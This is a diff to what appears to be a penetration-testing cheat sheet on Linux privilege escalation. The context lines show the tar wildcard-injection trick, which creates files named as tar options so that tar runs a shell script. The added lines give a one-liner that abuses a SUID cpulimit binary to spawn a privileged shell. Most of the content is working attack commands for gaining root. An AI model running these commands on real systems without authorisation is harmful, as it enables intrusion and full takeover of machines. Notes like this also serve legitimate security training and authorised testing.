@@ -159,7 +159,11 @@ Using a fine-grained set of privileges: Use of capability can be more clearly un
             echo -e '#!/bin/bash\n/bin/bash' > shell.sh
             echo "" > "--checkpoint-action=exec=sh shell.sh"
             echo "" > --checkpoint=1
-            
+
+### PRIVESC WITH CPULIMIT binary if suid bit set
+
+       cpulimit -l 100 -f -- /bin/sh -p
+
 
 
             
